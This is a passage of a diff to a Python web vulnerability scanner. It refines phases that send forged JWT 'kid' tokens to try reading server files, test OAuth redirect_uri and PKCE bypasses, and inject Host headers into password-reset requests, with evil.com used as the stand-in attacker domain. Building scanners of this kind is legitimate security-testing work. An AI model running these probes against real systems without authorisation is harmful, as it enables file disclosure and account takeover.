                             forged_kid_token = f"{forged_b64}.{parts[1]}.{parts[2]}"
-                            try:
-                                k_req = urllib.request.Request(
-                                    url,
-                                    method="GET",
-                                    headers={
-                                        "User-Agent": "Mozilla/5.0",
-                                        "Authorization": f"Bearer {forged_kid_token}",
-                                        **_ja_extra_headers,
-                                    },
+                            (
+                                ks,
+                                k_base,
+                                k_garbage,
+                                k_body,
+                                k_base_body,
+                                k_garbage_body,
+                            ) = await _jwt_acceptance_verdict(
+                                _ja_urlopen,
+                                url,
+                                {"User-Agent": "Mozilla/5.0", **_ja_extra_headers},
+                                forged_kid_token,
+                            )
+                            if (
+                                ks in (200, 201)
+                                and any(w in k_body for w in ["root:", "daemon:", "localhost"])
+                                and not any(
+                                    w in k_base_body for w in ["root:", "daemon:", "localhost"]
                                 )
-                                ks, _, kb = await _async_urlopen(_ja_urlopen, k_req, timeout=10)
-                                if ks == 200:
-                                    body_k = kb.decode("utf-8", errors="ignore").lower()
-                                    if any(w in body_k for w in ["root:", "daemon:", "localhost"]):
-                                        findings.append(
-                                            f"[jwtadv-kid-file-read] {url} — KID={kid_payload} returned file contents"
-                                        )
-                                        break
-                            except asyncio.CancelledError:
-                                raise
-                            except Exception:
-                                continue
+                            ):
+                                findings.append(
+                                    f"[jwtadv-kid-file-read] {url} — KID={kid_payload} returned file contents (HTTP {ks}, baseline={k_base})"
+                                )
+                                break
                 except asyncio.CancelledError:
                     raise
                 except Exception:
@@ -2033,7 +2184,7 @@ async def phase_36_JWTADV(
         findings.append("[jwtadv] No JWT tokens found for advanced analysis")
     out = ensure(_out)
     out.write_text("\n".join(findings) + ("\n" if findings else ""))
-    log("ok", f"36-JWTADV: {len(findings)} JWT analysis findings -> {out}")
+    log("OK", f"36-JWTADV: {len(findings)} JWT analysis findings -> {out}")
     return {"36-JWTADV": str(out), "count": len(findings)}
 
 
@@ -2069,7 +2220,7 @@ async def phase_39_OAUTH(
     _out = outdir / "oauth_misconfig.txt"
     if _out.exists() and not force:
         return {"39-OAUTH": str(_out), "count": count_nonblank(_out)}
-    log("info", "Phase 39-OAUTH: OAuth misconfiguration testing")
+    log("INFO", "Phase 39-OAUTH: OAuth misconfiguration testing")
     findings: List[str] = []
     # Load JWT analysis findings to inform OAuth testing
     jwt_file = outdir / "jwt_analysis.txt"
@@ -2087,7 +2238,7 @@ async def phase_39_OAUTH(
         : _PIPELINE_CFG.sample_hosts_jwt
     ]
     if not hosts:
-        log("warn", "39-OAUTH: no hosts; skipping")
+        log("WARNING", "39-OAUTH: no hosts; skipping")
         return {"39-OAUTH": str(_out), "count": 0}
     endpoints_to_test: List[str] = []
     for base in hosts:
@@ -2100,7 +2251,7 @@ async def phase_39_OAUTH(
             req = urllib.request.Request(
                 ep_url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_oa_extra_headers}
             )
-            s, h, _ = await _async_urlopen_no_redirect(_oa_urlopen, req, timeout=8)
+            s, h, _ = await _async_urlopen_no_redirect(req, timeout=8)
             if s in (200, 201, 302, 301, 405):
                 if s not in (302, 301):
                     try:
@@ -2109,7 +2260,7 @@ async def phase_39_OAUTH(
                             method="GET",
                             headers={"User-Agent": "Mozilla/5.0", **_oa_extra_headers},
                         )
-                        _, _, _ = await _async_urlopen_no_redirect(_oa_urlopen, req2, timeout=8)
+                        _, _, _ = await _async_urlopen_no_redirect(req2, timeout=8)
                     except asyncio.CancelledError:
                         raise
                     except Exception:
@@ -2133,7 +2284,7 @@ async def phase_39_OAUTH(
                 method="GET",
                 headers={"User-Agent": "Mozilla/5.0", **_oa_extra_headers},
             )
-            s, rh, _ = await _async_urlopen_no_redirect(_oa_urlopen, req, timeout=8)
+            s, rh, _ = await _async_urlopen_no_redirect(req, timeout=8)
             loc = rh.get("Location", "")
             if "evil.com" in loc:
                 findings.append(
@@ -2145,7 +2296,7 @@ async def phase_39_OAUTH(
                 method="GET",
                 headers={"User-Agent": "Mozilla/5.0", **_oa_extra_headers},
             )
-            s2, rh2, _ = await _async_urlopen_no_redirect(_oa_urlopen, req2, timeout=8)
+            s2, rh2, _ = await _async_urlopen_no_redirect(req2, timeout=8)
             loc2 = rh2.get("Location", "")
             if "evil2.com" in loc2:
                 findings.append(
@@ -2225,9 +2376,9 @@ async def phase_39_OAUTH(
                 )
                 _, _, pkce_b = await _async_urlopen(_oa_urlopen, pkce_req, timeout=8)
                 pkce_text = pkce_b.decode("utf-8", errors="ignore")
-                if "access_token" in pkce_text or "error" not in pkce_text.lower():
+                if "access_token" in pkce_text:
                     findings.append(
-                        f"[oauth-pkce-bypass] {token_ep} — PKCE with method={pkce_test.get('code_challenge_method', 'none')} not properly enforced"
+                        f"[oauth-pkce-bypass] {token_ep} — PKCE with method={pkce_test.get('code_challenge_method', 'none')} not enforced, token issued"
                     )
             except asyncio.CancelledError:
                 raise
@@ -2248,7 +2399,7 @@ async def phase_39_OAUTH(
         findings.append("[oauth] No OAuth endpoints found or no misconfigurations detected")
     out = ensure(_out)
     out.write_text("\n".join(findings) + ("\n" if findings else ""))
-    log("ok", f"39-OAUTH: {len(findings)} OAuth probes -> {out}")
+    log("OK", f"39-OAUTH: {len(findings)} OAuth probes -> {out}")
     return {"39-OAUTH": str(out), "count": len(findings)}
 
 
@@ -2282,7 +2433,7 @@ async def phase_40_PWRESET(
     _out = outdir / "password_reset.txt"
     if _out.exists() and not force:
         return {"40-PWRESET": str(_out), "count": count_nonblank(_out)}
-    log("info", "Phase 40-PWRESET: password reset logic testing")
+    log("INFO", "Phase 40-PWRESET: password reset logic testing")
     findings: List[str] = []
     # Load JWT analysis findings to inform password reset testing
     jwt_file = outdir / "jwt_analysis.txt"
@@ -2306,7 +2457,7 @@ async def phase_40_PWRESET(
         : _PIPELINE_CFG.sample_hosts_jwt
     ]
     if not hosts:
-        log("warn", "40-PWRESET: no hosts; skipping")
+        log("WARNING", "40-PWRESET: no hosts; skipping")
         return {"40-PWRESET": str(_out), "count": 0}
     endpoints = []
     for base in hosts:
@@ -2317,7 +2468,7 @@ async def phase_40_PWRESET(
             req = urllib.request.Request(
                 ep_url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_pw_extra_headers}
             )
-            s, h, b = await _async_urlopen_no_redirect(_pw_urlopen, req, timeout=8)
+            s, h, b = await _async_urlopen_no_redirect(req, timeout=8)
             if s in (200, 201, 302, 301):
                 findings.append(f"[pwreset-endpoint] {ep_url} -> HTTP {s}")
                 for pname in _PWRESET_EMAIL_PARAMS:
@@ -2336,7 +2487,7 @@ async def phase_40_PWRESET(
                                 **_pw_extra_headers,
                             },
                         )
-                        s2, _, b2 = await _async_urlopen_no_redirect(_pw_urlopen, req2, timeout=8)
+                        s2, _, b2 = await _async_urlopen_no_redirect(req2, timeout=8)
                         if s2 in (200, 201, 302):
                             findings.append(
                                 f"[pwreset-param-pollution] {ep_url} — {pname} accepts email param"
@@ -2358,8 +2509,7 @@ async def phase_40_PWRESET(
                             **_pw_extra_headers,
                         },
                     )
-                    s3, h3, _ = await _async_urlopen_no_redirect(
-                        _pw_urlopen, host_inject_req, timeout=8
+                    s3, h3, _ = await _async_urlopen_no_redirect(host_inject_req, timeout=8
                     )
                     loc = h3.get("Location", "") or h3.get("location", "")
                     if "evil.com" in loc:
@@ -2384,7 +2534,7 @@ async def phase_40_PWRESET(
         findings.append("[pwreset] No password reset endpoints or logic issues detected")
     out = ensure(_out)
     out.write_text("\n".join(findings) + ("\n" if findings else ""))
-    log("ok", f"40-PWRESET: {len(findings)} password reset probes -> {out}")
+    log("OK", f"40-PWRESET: {len(findings)} password reset probes -> {out}")
     return {"40-PWRESET": str(out), "count": len(findings)}
 
 
@@ -2432,14 +2582,14 @@ async def phase_61_OAUTH_ADV(
     _out = outdir / "oauth_advanced.txt"
     if _out.exists() and not force:
         return {"61-OAUTH-ADV": str(_out), "count": count_nonblank(_out)}
-    log("info", "Phase 61-OAUTH-ADV: advanced OAuth redirect_uri bypass testing")
+    log("INFO", "Phase 61-OAUTH-ADV: advanced OAuth redirect_uri bypass testing")
     findings: List[str] = []
     _o_urlopen = _get_urlopener()
     _o_extra_headers = _extra_headers_dict()
     hosts_file = outdir / "hosts.txt"
     hosts = read_lines(hosts_file) if hosts_file.exists() else []
     if not hosts:
-        log("warn", "61-OAUTH-ADV: no hosts; skipping")
+        log("WARNING", "61-OAUTH-ADV: no hosts; skipping")
         return {"61-OAUTH-ADV": str(_out), "count": 0}
     for host in hosts[:10]:
         host_clean = _extract_host(host)
@@ -2477,19 +2627,13 @@ async def phase_61_OAUTH_ADV(
                                     method="GET",
                                     headers={"User-Agent": "Mozilla/5.0", **_o_extra_headers},
                                 )
-                                ts, theaders, tbody = await _async_urlopen(
-                                    _o_urlopen, treq, timeout=8
+                                ts, theaders, _ = await _async_urlopen_no_redirect(treq, timeout=8
                                 )
-                                tbody_str = tbody.decode("utf-8", errors="ignore")
-                                if "evil.com" in tbody_str:
+                                loc = theaders.get("Location", "")
+                                if ts in (301, 302, 303, 307, 308) and "evil.com" in loc:
                                     findings.append(
                                         f"[oauth-redirect-bypass] {test_url} — param={param} "
-                                        f"redirect_uri={bypass_url} — reflected in response"
-                                    )
-                                if "evil.com" in theaders.get("Location", ""):
-                                    findings.append(
-                                        f"[oauth-redirect-bypass] {test_url} — param={param} "
-                                        f"redirect_uri={bypass_url} — redirect to attacker domain"
+                                        f"redirect_uri={bypass_url} — redirect to attacker domain (HTTP {ts})"
                                     )
                             except asyncio.CancelledError:
                                 raise
@@ -2548,7 +2692,7 @@ async def phase_61_OAUTH_ADV(
         findings.append("[oauth-adv] No advanced OAuth bypasses detected")
     out = ensure(_out)
     out.write_text("\n".join(findings) + ("\n" if findings else ""))
-    log("ok", f"61-OAUTH-ADV: {len(findings)} OAuth findings → {out}")
+    log("OK", f"61-OAUTH-ADV: {len(findings)} OAuth findings → {out}")
     return {"61-OAUTH-ADV": str(out), "count": len(findings)}
 
 
@@ -2576,7 +2720,7 @@ async def phase_65_SESSION(
     _out = outdir / "session_analysis.txt"
     if _out.exists() and not force:
         return {"65-SESSION": str(_out), "count": count_nonblank(_out)}
-    log("info", "Phase 65-SESSION: session token analysis")
+    log("INFO", "Phase 65-SESSION: session token analysis")
     findings: List[str] = []
     _s_urlopen = _get_urlopener()
     _s_extra = _extra_headers_dict()
@@ -2666,7 +2810,7 @@ async def phase_65_SESSION(
         findings.append("[session] No session tokens or cookies found")
     out = ensure(_out)
     out.write_text("\n".join(findings) + ("\n" if findings else ""))
-    log("ok", f"65-SESSION: {len(findings)} findings → {out}")
+    log("OK", f"65-SESSION: {len(findings)} findings → {out}")
     return {"65-SESSION": str(out), "count": len(findings)}
 
 
@@ -2683,7 +2827,7 @@ async def phase_82_OAUTHDEEP(
     _out = outdir / "oauth_deep.txt"
     if _out.exists() and not force:
         return {"82-OAUTHDEEP": str(_out), "count": count_nonblank(_out)}
-    log("info", "Phase 82-OAUTHDEEP: OAuth redirect_uri parser diff + PKCE/state analysis")
+    log("INFO", "Phase 82-OAUTHDEEP: OAuth redirect_uri parser diff + PKCE/state analysis")
     findings: List[str] = []
     _oa_urlopen = _get_urlopener()
     _oa_headers = _extra_headers_dict()
@@ -2780,5 +2924,5 @@ async def phase_82_OAUTHDEEP(
 
     out = ensure(_out)
     out.write_text("\n".join(findings) + ("\n" if findings else ""))
-    log("ok", f"82-OAUTHDEEP: {len(findings)} OAuth deep findings → {out}")
+    log("OK", f"82-OAUTHDEEP: {len(findings)} OAuth deep findings → {out}")
     return {"82-OAUTHDEEP": str(_out), "count": len(findings)}
